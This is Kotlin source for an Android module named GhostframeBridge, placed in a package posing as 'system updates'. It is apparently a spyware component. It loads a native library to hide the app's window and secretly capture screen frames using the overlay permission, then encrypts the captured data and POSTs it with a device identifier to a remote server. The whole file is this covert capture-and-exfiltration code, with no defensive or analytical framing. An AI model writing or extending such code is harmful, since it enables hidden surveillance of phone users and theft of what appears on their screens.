package com.system.updates.modules.bridges

import android.content.Context
import android.os.Build
import android.util.Log
import com.system.updates.CryptoManager
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class GhostframeBridge(private val context: Context) {

    private val TAG = "GhostframeBridge"
    private val crypto = CryptoManager(context)
    private val random = SecureRandom()

    companion object {
        init {
            try {
                System.loadLibrary("ghostframe_native")
                Log.i("GhostframeBridge", "Native library loaded.")
            } catch (e: UnsatisfiedLinkError) {
                Log.e("GhostframeBridge", "Failed to load native library: ${e.message}")
            }
        }
    }

    private external fun nativeHideApplicationWindow(): Boolean
    private external fun nativeCaptureHiddenScreenFrame(): ByteArray?
    private external fun nativeCheckOverlayPermission(): Boolean

    fun initialize(): Boolean {
        return try {
            nativeCheckOverlayPermission()
        } catch (e: Exception) {
            Log.e(TAG, "Initialization failed: ${e.message}")
            false
        }
    }

    fun hideApplicationWindow(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!android.provider.Settings.canDrawOverlays(context)) {
                Log.e(TAG, "Overlay permission not granted")
                return false
            }
        }
        return try {
            nativeHideApplicationWindow()
        } catch (e: Exception) {
            Log.e(TAG, "Hide window failed: ${e.message}")
            false
        }
    }

    fun captureHiddenScreen(): ByteArray? {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!android.provider.Settings.canDrawOverlays(context)) {
                Log.e(TAG, "Overlay permission not granted")
                return null
            }
        }
        return try {
            nativeCaptureHiddenScreenFrame()
        } catch (e: Exception) {
            Log.e(TAG, "Capture failed: ${e.message}")
            null
        }
    }

    fun encryptAndSend(data: ByteArray, serverUrl: String): String? {
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data)
        val full = iv + encrypted
        val encoded = android.util.Base64.encodeToString(full, android.util.Base64.NO_WRAP)
        return try {
            val url = java.net.URL(serverUrl)
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("X-Device-ID", crypto.getDeviceId())
            conn.doOutput = true
            conn.outputStream.write(encoded.toByteArray())
            val response = conn.responseCode
            conn.disconnect()
            if (response == 200) "OK" else "ERR:$response"
        } catch (e: Exception) {
            Log.e(TAG, "Send failed: ${e.message}")
            null
        }
    }
}